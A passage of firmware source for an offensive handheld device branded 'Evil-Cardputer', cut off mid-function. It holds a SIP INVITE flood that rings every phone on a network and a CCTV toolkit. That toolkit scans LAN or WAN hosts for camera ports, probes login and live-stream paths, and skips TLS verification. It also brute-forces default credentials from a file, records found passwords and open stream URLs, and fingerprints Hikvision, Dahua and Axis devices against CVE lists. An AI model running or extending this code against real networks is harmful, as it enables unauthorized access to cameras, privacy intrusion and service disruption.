                 "Call-ID: " + callid + "\r\nCSeq: 1 INVITE\r\n"
                 "Max-Forwards: 70\r\nContact: <sip:ring@" + WiFi.localIP().toString() + ">\r\n"
                 "User-Agent: Evil-Cardputer/1.4.3\r\n" +
                 (addSDP ? String("Content-Type: application/sdp\r\n") : "") +
                 "Content-Length: " + String(addSDP ? sdp.length() : 0) + "\r\n\r\n" +
                 (addSDP ? sdp : "");

    sendSIPRaw(dst, pkt);
    dlg.push_back({dst, branch, callid});
    delay(2);     // â‰ˆ 500 pps
  }

  /* ---------- temporisation ---------- */
  unsigned long stopAt = millis() + ringSec * 1000UL;
  while (millis() < stopAt && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) delay(100);

  /* ---------- CANCEL ---------- */
  for (auto &d : dlg) {
    String cancel = "CANCEL sip:" + d.ip.toString() + "@" + d.ip.toString() + " SIP/2.0\r\n"
                    "Via: SIP/2.0/UDP " + WiFi.localIP().toString() + ";branch=" + d.branch + ";rport\r\n"
                    "From: \"Broadcast\" <sip:ring@" + WiFi.localIP().toString() + ">;tag=R\r\n"
                    "To: <sip:" + d.ip.toString() + "@" + d.ip.toString() + ">\r\n"
                    "Call-ID: " + d.callid + "\r\nCSeq: 1 CANCEL\r\n"
                    "Max-Forwards: 70\r\nContent-Length: 0\r\n\r\n";
    sendSIPRaw(d.ip, cancel);
    delay(1);
  }
  sipUdp.stop();
  waitAndReturnToMenu("RingAll done (" + String(dlg.size()) + " INVITE)");
}

/*
============================================================================================================================
CCTV TOOLKIT
============================================================================================================================
*/

std::vector<IPAddress> hostslistCCTV;   // globale (ne pas masquer)


// ====== Constantes ======

// Ports HTTPS additionnels
const uint16_t httpsPorts[] PROGMEM = { 443, 8443, 8444 };

// User-Agent et Accept (headers globaux pour HTTPClient)
static const char UA_STR[] PROGMEM =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
  "(KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36";
static const char ACCEPT_STR[] PROGMEM =
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";

inline bool isHttpsPort(uint16_t p) {
  for (size_t i = 0; i < sizeof(httpsPorts)/sizeof(httpsPorts[0]); ++i) {
    if (p == pgm_read_word(&httpsPorts[i])) return true;
  }
  return false;
}

/* DÃ©termine le protocole depuis le port (Ã©tendu) */
const char* protoFromPort(uint16_t p) {
  return isHttpsPort(p) ? "https" : "http";
}

// ==== utilitaire interne : begin HTTP/HTTPS avec follow redirects, TLS insecure si besoin ====
void httpBeginAuto(HTTPClient& http, WiFiClient& cli, WiFiClientSecure& tls, const String& fullUrl) {
  if (fullUrl.startsWith("https://")) {
    tls.setInsecure();
    http.begin(tls, fullUrl);
  } else {
    http.begin(cli, fullUrl);
  }
  http.setTimeout(500); // TIMEOUT Ã©tendu
  http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
  // Headers par dÃ©faut
  char uaBuf[128]; strncpy(uaBuf, UA_STR, sizeof(uaBuf));
  char acBuf[128]; strncpy(acBuf, ACCEPT_STR, sizeof(acBuf));
  http.addHeader("User-Agent", uaBuf, true, true);
  http.addHeader("Accept", acBuf, true, true);
}

/**** Ports Ã  balayer (liste Ã©tendue) ****/
const uint16_t cameraPorts[] PROGMEM = {
  // Web
  80, 81, 82, 83, 84, 85, 86, 87, 88, 89,
  
  443, 8080, 8443, 8000,

  8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010,
  8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
  8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
  8100, 8101, 8102, 8103, 8104,

  // others web
  7001, 8999, 9000, 9001, 9002, 10000,
  8181, 5001, 50000, 8880, 8889, 3001,

  // RTSP
  554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,

  // RTMP
  1935, 1936, 1937, 1938, 1939,

  // ONVIF / dÃ©couverte
  3702,

  // Divers
  37777, 5000
};

const size_t NB_CAMERA_PORTS = sizeof(cameraPorts) / sizeof(cameraPorts[0]);

/**** Paths HTTP/HTTPS courants (liste Ã©tendue) ****/
const char * const cameraPaths[] PROGMEM = {
  "/", "/1", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live",
  "/snapshot", "/onvif-http/snapshot", "/system.ini", "/config", "/setup", "/cgi-bin/",
  "/api/", "/camera", "/img/main.cgi", "/index.html", "/onvif/device_service", "/onvif/streaming",
  "/axis-cgi/mjpg/video.cgi", "/axis-cgi/com/ptz.cgi", "/axis-cgi/param.cgi",
  "/cgi-bin/snapshot.cgi", "/cgi-bin/hi3510/snap.cgi", "/videostream.cgi", "/mjpg/video.mjpg"
};

const char * const mjpegPaths[] PROGMEM = {
  // Axis
  "/axis-cgi/mjpg/video.cgi",

  // Foscam / D-Link / EasyN
  "/mjpeg.cgi",
  "/video/mjpg.cgi",
  "/videostream.cgi",

  // Edimax / Intellinet / TP-Link / Trendnet / Vivotek
  "/mjpg/video.mjpg",
  "/jpg/image.jpg",
  "/snapshot.cgi",
  "/image.jpg",
  "/cgi-bin/video.jpg",
  "/cgi-bin/viewer/video.jpg",

  // Panasonic
  "/SnapshotJPEG",
  "/cgi-bin/nphMotionJpeg",

  // Mobotix
  "/faststream.jpg",
  "/control/faststream.jpg",

  // GÃ©nÃ©riques
  "/stream.jpg",
  "/video.jpg",
  "/liveimg.cgi",
  "/now.jpg",
  "/image",
  "/oneshotimage.jpg"
};
const size_t NB_MJPEG_PATHS = sizeof(mjpegPaths) / sizeof(mjpegPaths[0]);

const size_t NB_CAMERA_PATHS = sizeof(cameraPaths) / sizeof(cameraPaths[0]);

/**** Content-Types indicateurs camÃ©ra ****/
const char * const camContentTypes[] PROGMEM = {
  // Snapshots / MJPEG
  "image/jpeg",
  "image/jpg",                  // parfois utilisÃ©
  "image/pjpeg",                // progressive JPEG
  "image/png",                  // snapshots parfois PNG
  "image/gif",                  // rarement (old firmwares)
  "multipart/x-mixed-replace",  // MJPEG stream

  // VidÃ©os
  "video/mpeg",
  "video/mp4",
  "video/h264",
  "video/h265",                 // camÃ©ras rÃ©centes
  "video/hevc",
  "video/3gpp",
  "video/webm",
  "video/ogg",
  "application/mp4",            // variation
  "application/sdp",            // RTSP proxifiÃ© en HTTP
  "application/vnd.apple.mpegurl", // HLS (m3u8)
  "application/x-mpegURL",      // HLS alt spelling
  "application/octet-stream",   // souvent MJPEG ou TS raw
  "video/MP2T",                 // MPEG-TS
  "application/x-rtsp",         // certains proxys

  // Divers (API/JSON/XML qui renvoient parfois des URLs stream)
  "text/html",
  "application/json",
  "application/xml",
  "text/xml"
};

const size_t NB_CT = sizeof(camContentTypes)/sizeof(camContentTypes[0]);


struct CVEEntry { const char *brand; const char *cve; };
const CVEEntry cveDB[] PROGMEM = {
  // Hikvision
  {"hikvision","CVE-2021-36260"}, {"hikvision","CVE-2017-7921"},
  {"hikvision","CVE-2021-31955"}, {"hikvision","CVE-2021-31956"},
  {"hikvision","CVE-2021-31957"}, {"hikvision","CVE-2021-31958"},
  {"hikvision","CVE-2021-31959"}, {"hikvision","CVE-2021-31960"},
  {"hikvision","CVE-2021-31961"}, {"hikvision","CVE-2021-31962"},
  {"hikvision","CVE-2021-31963"}, {"hikvision","CVE-2021-31964"},
  {"hikvision","CVE-2024-29947"}, {"hikvision","CVE-2024-29948"},
  {"hikvision","CVE-2024-29949"}, {"hikvision","CVE-2024-47485"},
  {"hikvision","CVE-2024-47486"}, {"hikvision","CVE-2024-47487"},

  // Dahua
  {"dahua","CVE-2021-33044"}, {"dahua","CVE-2022-30563"},
  {"dahua","CVE-2021-33045"}, {"dahua","CVE-2021-33046"},
  {"dahua","CVE-2021-33047"}, {"dahua","CVE-2021-33048"},
  {"dahua","CVE-2021-33049"}, {"dahua","CVE-2021-33050"},
  {"dahua","CVE-2021-33051"}, {"dahua","CVE-2021-33052"},
  {"dahua","CVE-2021-33053"}, {"dahua","CVE-2021-33054"},
  {"dahua","CVE-2025-31700"}, {"dahua","CVE-2024-13130"},

  // Axis
  {"axis","CVE-2018-10660"}, {"axis","CVE-2020-29550"}, {"axis","CVE-2020-29551"},
  {"axis","CVE-2020-29552"}, {"axis","CVE-2020-29553"}, {"axis","CVE-2020-29554"},
  {"axis","CVE-2020-29555"}, {"axis","CVE-2020-29556"}, {"axis","CVE-2020-29557"},
  {"axis","CVE-2020-29558"}, {"axis","CVE-2020-29559"}, {"axis","CVE-2020-29560"},
  {"axis","CVE-2024-7696"}, {"axis","CVE-2024-6749"},
  {"axis","CVE-2024-6831"}, {"axis","CVE-2023-21406"},
  {"axis","CVE-2023-5800"},

  // Bosch
  {"bosch","CVE-2023-39509"}, {"bosch","CVE-2024-33618"},
  {"bosch","CVE-2019-6957"}, {"bosch","CVE-2019-6958"},
  {"bosch","CVE-2018-20299"},

  // Samsung / Hanwha Vision
  {"samsung","CVE-2023-5747"}, {"samsung","CVE-2023-5037"},
  {"samsung","CVE-2023-5038"}, {"samsung","CVE-2024-41882"},
  {"samsung","CVE-2024-41883"}, {"samsung","CVE-2024-41884"},
  {"samsung","CVE-2024-41885"}, {"samsung","CVE-2024-41886"},
  {"samsung","CVE-2024-41887"}, {"samsung","CVE-2023-6095"},
  {"samsung","CVE-2023-6096"},

  // Panasonic
  {"panasonic","CVE-2020-29193"}, {"panasonic","CVE-2020-29194"},
  {"panasonic","CVE-2022-4621"},

  // Vivotek
  {"vivotek","CVE-2024-26548"}, {"vivotek","CVE-2019-10256"},
  {"vivotek","CVE-2019-14457"}, {"vivotek","CVE-2019-14458"},

  // Sony
  {"sony","CVE-2018-3937"}, {"sony","CVE-2018-3938"},

  // CP Plus
  {"cp plus","CVE-2023-3704"}, {"cp plus","CVE-2023-3705"},
  {"cp plus","CVE-2024-3434"}
};

const size_t NB_CVE = sizeof(cveDB) / sizeof(cveDB[0]);

/**** Mots-clÃ©s serveurs / marques pour fingerprint rapide ****/
const char * const brandKeys_hikvision[] PROGMEM = {"hikvision","dvr","nvr"};
const char * const brandKeys_dahua[]     PROGMEM = {"dahua","dvr","nvr"};
const char * const brandKeys_axis[]      PROGMEM = {"axis","axis communications"};
const char * const brandKeys_sony[]      PROGMEM = {"sony","ipela"};
const char * const brandKeys_bosch[]     PROGMEM = {"bosch","security systems"};
const char * const brandKeys_samsung[]   PROGMEM = {"samsung","samsung techwin"};
const char * const brandKeys_panasonic[] PROGMEM = {"panasonic","network camera"};
const char * const brandKeys_vivotek[]   PROGMEM = {"vivotek","network camera"};
const char * const brandKeys_generic[]   PROGMEM = {"camera","webcam","surveillance","ip camera","network camera","dvr","nvr","recorder"};


// Trim util
void trimStringCCTV(String &s) {
  s.trim();
  // retire Ã©ventuel BOM UTF-8
  if (s.length() >= 3 && (uint8_t)s[0]==0xEF && (uint8_t)s[1]==0xBB && (uint8_t)s[2]==0xBF) {
    s.remove(0,3);
  }
}


/* ---------- Compact UI (240x135, text size 1.5) + SD summary ---------- */

struct UiCtx {
  IPAddress ip;
  String phase;
  std::vector<String> lines;   // last N lines on screen
  String report;               // full per-host summary (saved to SD)
} _ui;

static const int UI_W = 240, UI_H = 135;
static const int UI_TEXTSIZE = 15; // ~ line height with setTextSize(1.5)
static const int UI_HEADER_H = 3 * UI_TEXTSIZE;     // title + target + phase
static const int UI_CONTENT_Y = UI_HEADER_H + 2;    // content area start
static const int UI_CONTENT_H = UI_H - UI_HEADER_H;

int uiMaxLines() { return max(1, UI_CONTENT_H / UI_TEXTSIZE); }
bool g_scanFromSD = false;
void uiPrintAt(int16_t x, int16_t y, const String& s, uint16_t color) {
  M5.Display.setTextColor(color, TFT_BLACK);
  M5.Display.setCursor(x, y);
  M5.Display.print(s);
}

void uiDrawHeader() {
  M5.Display.fillRect(0, 0, UI_W, UI_HEADER_H, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  uiPrintAt(0, 0, "CCTV ToolKit", menuTextFocusedColor);
  uiPrintAt(0, UI_TEXTSIZE, "Target: " + _ui.ip.toString(), menuTextUnFocusedColor);
  uiPrintAt(0, UI_TEXTSIZE * 2, "Phase: " + _ui.phase, menuTextFocusedColor);
}

void uiDrawContent() {
  M5.Display.fillRect(0, UI_CONTENT_Y, UI_W, UI_CONTENT_H, TFT_BLACK);
  M5.Display.setTextSize(1);
  int linesToShow = min((int)_ui.lines.size(), uiMaxLines());
  int start = (int)_ui.lines.size() - linesToShow;
  for (int i = 0; i < linesToShow; ++i) {
    uiPrintAt(0, UI_CONTENT_Y + i * UI_TEXTSIZE, _ui.lines[start + i], menuTextUnFocusedColor);
  }
}

void uiRefresh(int pct = -1, const String& label = "") {
  uiDrawHeader();
  uiDrawContent();
  M5.Display.display();
}
std::vector<String> loginCandidates;
void uiBeginHost(const IPAddress& ip) {
  _ui.ip = ip;
  _ui.phase = "Startingâ€¦";
  _ui.lines.clear();
  _ui.report = "";
  loginCandidates.clear(); // NEW
}

void uiPhase(const String& phase) {
  _ui.phase = phase;
  uiRefresh();
}

void uiReportOnly(const String& line) {
  _ui.report += line + "\n";
}

void uiAppend(const String& line, bool alsoInReport = true) {
  if ((int)_ui.lines.size() >= uiMaxLines()) _ui.lines.erase(_ui.lines.begin());
  _ui.lines.push_back(line);
  if (alsoInReport) _ui.report += line + "\n";
  uiDrawContent();
  M5.Display.display();
}

void uiEndHostAndSave() {
  bool saved = false;
  #ifdef SD_FAT_VERSION   // SdFat or standard SD both define SD
  #endif
  File f = SD.open("/evil/CCTV/CCTV_scan.txt", FILE_APPEND);
  if (!f) f = SD.open("/evil/CCTV/CCTV_scan.txt", FILE_WRITE);
  if (f) {
    f.println("----------------------------------------------------------------");
    f.printf("Target: %s\n", _ui.ip.toString().c_str());
    f.print(_ui.report);
    f.println();
    f.close();
    saved = true;
  }
  uiRefresh(100, "Done");
}

int countCVEsForBrand(const String& brand) {
  int n = 0;
  for (size_t i = 0; i < NB_CVE; ++i) {
    CVEEntry e; memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
    if (brand.equalsIgnoreCase(e.brand)) ++n;
  }
  return n;
}

/* ---------- Helpers UI & IP ---------- */

int chooseScanModeMenu() {
  // 0 = Local (LAN), 1 = Single IP (WAN), 2 = From file (SD),
  // 3 = MJPEG Live Viewer, -1 = Cancel
  int index = 0;
  const int itemCount = 5 ;// â† augmentÃ©
const char* items[itemCount] = {
    "Scan Local (LAN)",
    "Scan IP unique (WAN)",
    "Scan from file (SD)",
    "MJPEG Live Viewer (SD)",
    "Spycam Detector (WiFi)"
  };

  enterDebounce();
  bool need = true;

  while (true) {
    M5.update();
    M5Cardputer.update();

    if (need) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      M5.Display.setCursor(5, 5);
      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
      M5.Display.println("CCTV ToolKit - Mode");
      M5.Display.println("--------------------------");
      for (int i = 0; i < itemCount; ++i) {
        if (i == index) {
          M5.Display.setTextColor(menuTextFocusedColor);
          M5.Display.fillRect(0, 30 + i*16, M5.Display.width(), 16, menuSelectedBackgroundColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(6, 30 + i*16);
        M5.Display.println(items[i]);
      }
      M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
      M5.Display.setCursor(5, M5.Display.height()-10);
      M5.Display.println(" ^/ v / ENTER / BACKSPACE");
      M5.Display.display();
      need = false;
    }

    if (M5Cardputer.Keyboard.isKeyPressed(';')) { index = (index - 1 + itemCount) % itemCount; need = true; delay(150); } // haut
    if (M5Cardputer.Keyboard.isKeyPressed('.')) { index = (index + 1) % itemCount;           need = true; delay(150); } // bas

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))      { return index; }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))  { return -1; }
    delay(10);
  }
}



bool promptIPv4(IPAddress& out) {
  M5.Display.clear();
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(5, 10);
  M5.Display.println("Entrer IP (ex: 8.8.8.8)");
  M5.Display.display();

  String s = getUserInput();
  if (!out.fromString(s)) {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("IP Adress invalid.");
    M5.Display.display();
    delay(1200);
    return false;
  }
  return true;
}

bool headerContainsAny(const String& hdr, const char * const * keys, size_t n) {
  String h = hdr; h.toLowerCase();
  for (size_t i = 0; i < n; ++i) {
    const char* kw = reinterpret_cast<const char*>(pgm_read_ptr(&keys[i]));
    if (h.indexOf(kw) >= 0) return true;
  }
  return false;
}

/* RequÃªtes GET avec headers + lecture corps limitÃ©e Ã  512 B */
bool httpRequest(IPAddress ip, uint16_t port, const char* path, String& respHdr, String& first512) {
  HTTPClient http;
  WiFiClient cli;
  WiFiClientSecure tls;
  
  String fullUrl = String(protoFromPort(port)) + "://" + ip.toString() + ":" + port + path;
  httpBeginAuto(http, cli, tls, fullUrl);

  int code = http.GET();
  if (code < 0) { http.end(); return false; }

  respHdr  = http.header("Server");

  first512 = "";
  Stream* s = http.getStreamPtr();
  uint32_t t0 = millis();
  while (s->available() == 0 && millis() - t0 < 300) delay(10);
  while (s->available() && first512.length() < 512) {
    char c = (char)s->read();
    first512 += c;
  }

  http.end();
  return true;
}

void local_scan_CCTV() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  enterDebounce();
  hostslistCCTV.clear();

  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setTextSize(1.5);

  IPAddress subnetMask = WiFi.subnetMask();
  IPAddress network = WiFi.localIP(); network[3] = 0;

  M5.Display.clear();
  int numHosts = 254 - subnetMask[3];
  M5.Display.setCursor(5, M5.Display.height() / 2);
  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
  M5.Display.println("       please wait...");

  char base_ip[16];
  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

  send_arp(base_ip, hostslistCCTV);
  read_arp_table(base_ip, 1, numHosts, hostslistCCTV);

  bool foundHosts = !hostslistCCTV.empty();

  for (int i = 1; i <= numHosts; i++) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) break;
    IPAddress currentIP = network; currentIP[3] = i;
    if (arpRequest(currentIP)) {
      hostslistCCTV.push_back(currentIP);
      foundHosts = true;
      logScanResult("Host : " + currentIP.toString());
    }
  }

  if (!foundHosts) {
    M5.Display.println("No hosts found.");
    delay(1500);
    waitAndReturnToMenu("No hosts found.");
    return;
  }
}

/* Test rapide dâ€™un port */
bool isPortOpen(IPAddress ip, uint16_t port, uint32_t tout = 1000) {
  WiFiClient client;
  bool ok = connectWithTimeout(client, ip, port, tout);
  if (ok) client.stop();
  return ok;
}

std::vector<uint16_t> scanCameraPorts(IPAddress ip) {
  uiPhase("Port scan");
  Serial.printf("-- Starting Port Scan --\n");
  std::vector<uint16_t> open;
  String openList = "";

  for (size_t i = 0; i < NB_CAMERA_PORTS; ++i) {
    uint16_t p = pgm_read_word(&cameraPorts[i]);

    Serial.printf("[TEST] %s:%u\n", ip.toString().c_str(), p);
    if (isPortOpen(ip, p, 750)) {
      open.push_back(p);
      if (openList.length()) openList += ",";
      openList += String(p);

      Serial.printf("-[OPEN] %s:%u\n", ip.toString().c_str(), p);
      logScanResult(ip.toString() + ":" + String(p));
      uiAppend("Open port: " + String(p), false);
    }

    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
    delay(6);
  }

  if (open.empty()) {
      uiAppend("Open ports: none");
      Serial.println("Open ports: none");
  } else {
      uiAppend("Ports: " + openList);
      Serial.println("[PORT] Ports: " + openList);
  }
  return open;
}

static const char* const LIVE_LIST_PATH = "/evil/CCTV/CCTV_live.txt";

void appendMjpegToLiveList(const IPAddress& ip, uint16_t port, const char* path) {
  ensureCCTVDir();
  String url  = "http://" + ip.toString() + ":" + String(port) + path;

  // Ã©viter doublons
  if (fileContainsToken(LIVE_LIST_PATH, url)) return;

  File f = SD.open(LIVE_LIST_PATH, FILE_APPEND);
  if (!f) f = SD.open(LIVE_LIST_PATH, FILE_WRITE);
  if (f) {
    String line = ip.toString() + " | " + url;
    f.println(line);
    f.close();
    uiAppend("[+] CCTV_live: " + line, false);
    Serial.printf("[CCTV_LIVE] %s\n", line.c_str());
  } else {
    uiAppend("[x] Cannot write CCTV_live.txt", false);
  }
}

int httpOk = 0;
void findLoginPages(IPAddress ip, const std::vector<uint16_t>& ports) {
  uiPhase("Finding login pages");
    Serial.printf("-- Starting Login Pages Finder --\n");
  int found = 0;

  for (uint16_t p : ports) {
    if (!isHttpLikePort(p)) continue;

    for (size_t k = 0; k < NB_CAMERA_PATHS; ++k) {
      const char* path = reinterpret_cast<const char*>(pgm_read_ptr(&cameraPaths[k]));
      HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
      String fullUrl = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;

      Serial.printf("[TEST] %s\n", fullUrl.c_str());
      httpBeginAuto(http, cli, tls, fullUrl);
      http.setTimeout(2000);

      int code = http.sendRequest("HEAD");
      http.end();

      if (code == 200) {
        Serial.printf("[LOGIN] %s (HTTP %d)\n", fullUrl.c_str(), code);
        logScanResult("[LOGIN] " + fullUrl);
        uiAppend(fullUrl + " (HTTP:" + code + ")", true);
        ++found;

        String pth(path);
        bool dup = false;
        for (auto &s : loginCandidates) { if (s == pth) { dup = true; break; } }
        if (!dup) loginCandidates.push_back(pth);
      }

      M5Cardputer.update();
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
          M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        uiAppend("Login pages: " + String(found));
        return;
      }
    }
  }
  uiAppend("Login pages: " + String(found));
}





void lookupCVEs(const String& brand) {
  for (size_t i = 0; i < NB_CVE; ++i) {
    CVEEntry e;
    memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
    if (brand.equalsIgnoreCase(e.brand)) {
      Serial.printf("   â†’ %s\n", e.cve);
      logScanResult("CVE " + String(e.cve));
    }
  }
}

void printCveLinks(const String& brand) {
  Serial.printf("[ðŸ›¡] Known CVEs for %s:\n", brand.c_str());
  for (size_t i = 0; i < NB_CVE; ++i) {
    CVEEntry e; memcpy_P(&e, cveDB + i, sizeof(CVEEntry));
    if (brand.equalsIgnoreCase(e.brand)) {
      Serial.printf("   https://nvd.nist.gov/vuln/detail/%s\n", e.cve);
    }
  }
}

#define MAX_USER_LEN 15
#define MAX_PASS_LEN 32

// fichier des identifiants (SD)
static const char* CREDS_FILE = "/evil/CCTV/CCTV_credentials.txt";

struct Credential {
  char user[MAX_USER_LEN];
  char pass[MAX_PASS_LEN];
};

void testDefaultCreds(IPAddress ip, const std::vector<uint16_t>& ports) {
  uiPhase("Default passwords");
    Serial.printf("-- Starting Default Password check --\n");

  if (!SD.exists(CREDS_FILE)) {
    Serial.println("[Ã—] credentials.txt missing.");
    uiAppend("[x] credentials.txt missing.");
    return;
  }

  File f = SD.open(CREDS_FILE, FILE_READ);
  if (!f) { uiAppend("[x] Cannot open credentials.txt"); return; }

  // --- NEW: fallback si rien nâ€™a Ã©tÃ© dÃ©tectÃ© avant
  static const char* DEFAULT_ENDPOINTS[] = { "/", "/login", "/admin", "/cgi-bin/login", "/index.html" };
  std::vector<String> fallbackEP;
  if (loginCandidates.empty()) {
    for (size_t i = 0; i < sizeof(DEFAULT_ENDPOINTS)/sizeof(DEFAULT_ENDPOINTS[0]); ++i) {
      fallbackEP.emplace_back(DEFAULT_ENDPOINTS[i]);
    }
  }
  const std::vector<String>& paths = loginCandidates.empty() ? fallbackEP : loginCandidates;
  const size_t N_ENDPOINTS = paths.size();

  // --- NEW: tableau de skip dynamique [ports.size()][paths.size()]
  std::vector<std::vector<bool>> skipPath(ports.size(), std::vector<bool>(N_ENDPOINTS, false));

  auto portIndex = [&](uint16_t port) -> int {
    for (size_t i = 0; i < ports.size(); ++i) if (ports[i] == port) return (int)i;
    return -1;
  };

  char line[160];
  bool success = false;
  Serial.println("[INFO] Starting credentials test...");

  // --- Phase 1 : prÃ©flight des chemins (un seul passage)
  for (uint16_t port : ports) {
    int pIdx = portIndex(port);
    if (pIdx < 0 || !isHttpLikePort(port)) continue;

    for (size_t i = 0; i < N_ENDPOINTS; ++i) {
      String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + paths[i];

      HTTPClient http0; WiFiClient cli0; WiFiClientSecure tls0;
      const char* hdrKeys[] = {"WWW-Authenticate"};
      http0.collectHeaders(hdrKeys, 1);
      httpBeginAuto(http0, cli0, tls0, url);
      int code0 = http0.GET();
      String www = http0.header("WWW-Authenticate");
      http0.end();

      bool needsAuth = (code0 == 401 || code0 == 403 || www.length() > 0);
      if (!needsAuth) {
        skipPath[pIdx][i] = true;
        Serial.printf("[SKIP] No auth needed at %s\n", url.c_str());
      }
    }
  }

  // --- Phase 2 : test des credentials uniquement sur les paths protÃ©gÃ©s
  while (f.available()) {
    size_t len = f.readBytesUntil('\n', line, sizeof(line) - 1);
    line[len] = '\0';

    char* p = strchr(line, '\r'); if (p) *p = '\0';
    p = strchr(line, '#');        if (p) *p = '\0';

    char* u = line; while (*u && isspace((uint8_t)*u)) u++;
    char* e = u + strlen(u); while (e > u && isspace((uint8_t)e[-1])) e--;
    *e = '\0';
    if (!*u) continue;

    char* sep = strpbrk(u, ":;,\t ");
    if (!sep) continue;
    *sep = '\0';
    char* pw = sep + 1; while (*pw && isspace((uint8_t)*pw)) pw++;

    Credential c;
    strncpy(c.user, u, MAX_USER_LEN - 1); c.user[MAX_USER_LEN - 1] = '\0';
    strncpy(c.pass, pw, MAX_PASS_LEN - 1); c.pass[MAX_PASS_LEN - 1] = '\0';

    for (uint16_t port : ports) {
      int pIdx = portIndex(port);
      if (pIdx < 0 || !isHttpLikePort(port)) continue;

      for (size_t i = 0; i < N_ENDPOINTS; ++i) {
        if (skipPath[pIdx][i]) continue;

        String url = String(protoFromPort(port)) + "://" + ip.toString() + ":" + String(port) + paths[i];
        Serial.printf("[TEST] Trying %s with %s:%s\n", url.c_str(), c.user, c.pass);

        HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
        httpBeginAuto(http, cli, tls, url);
        http.setAuthorization(c.user, c.pass);
        int code = http.GET();
        http.end();

        if (code == 200) {
          Serial.printf("[ðŸ”¥] %s -> %s:%s OK!\n", url.c_str(), c.user, c.pass);
          logScanResult("[PASS] " + url + " " + String(c.user) + ":" + String(c.pass));
          uiAppend("Default creds: FOUND");
          uiReportOnly(url + "  " + String(c.user) + ":" + String(c.pass));
          success = true;
          f.close();
          return;
        }

        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
          uiAppend("Default creds: aborted");
          f.close();
          return;
        }
      }
    }
  }

  f.close();
  if (!success) {
    Serial.println("[Ã—] No password found...");
    uiAppend("[x] No password found...");
  }
}






/* Fingerprint par marque */
bool fingerprintHikvision(IPAddress ip, uint16_t p) {
  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
  String proto = protoFromPort(p);
  String url1 = proto + "://" + ip.toString() + ":" + String(p) + "/System/configurationFile";
  String url2 = proto + "://" + ip.toString() + ":" + String(p) + "/ISAPI/System/deviceInfo";

  // Tentative 1: deviceInfo
  httpBeginAuto(http, cli, tls, url2);
  int code = http.GET();
  if (code == 200) {
    String xml = http.getString();
    int pos = xml.indexOf("<model>"); if (pos >= 0) {
      String model = xml.substring(pos + 7, xml.indexOf("</model>", pos));
      Serial.printf("   Model: %s\n", model.c_str());
      logScanResult("Model " + model);
    }
    http.end();
    printCveLinks("hikvision");
    return true;
  }
  http.end();

  // Tentative 2: configurationFile (peut nÃ©cessiter auth)
  httpBeginAuto(http, cli, tls, url1);
  code = http.GET();
  if (code == 200) {
    Serial.printf("   OK: %s\n", url1.c_str());
    http.end();
    printCveLinks("hikvision");
    return true;
  }
  http.end();
  return false;
}

bool fingerprintDahua(IPAddress ip, uint16_t p) {
  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
  String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + "/cgi-bin/magicBox.cgi?action=getSystemInfo";
  httpBeginAuto(http, cli, tls, url);
  int code = http.GET();
  if (code == 200) {
    Serial.printf("   OK: %s\n%s\n", url.c_str(), http.getString().c_str());
    http.end(); printCveLinks("dahua"); return true;
  }
  http.end(); return false;
}

bool fingerprintAxis(IPAddress ip, uint16_t p) {
  HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
  String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + "/axis-cgi/admin/param.cgi?action=list";
  httpBeginAuto(http, cli, tls, url);
  int code = http.GET();
  if (code == 200) {
    String txt = http.getString();
    Serial.printf("   OK: %s\n", url.c_str());

    // Parcours manuel des lignes (String nâ€™a pas split)
    int start = 0;
    while (start <= (int)txt.length()) {
      int nl = txt.indexOf('\n', start);
      String line = (nl < 0) ? txt.substring(start) : txt.substring(start, nl);
      // Trim lÃ©ger
      while (line.endsWith("\r")) line.remove(line.length()-1);

      if (line.indexOf("root.Brand")     >= 0 ||
          line.indexOf("root.Model")     >= 0 ||
          line.indexOf("root.Firmware")  >= 0) {
        Serial.printf("   %s\n", line.c_str());
      }

      if (nl < 0) break;
      start = nl + 1;
      M5Cardputer.update();
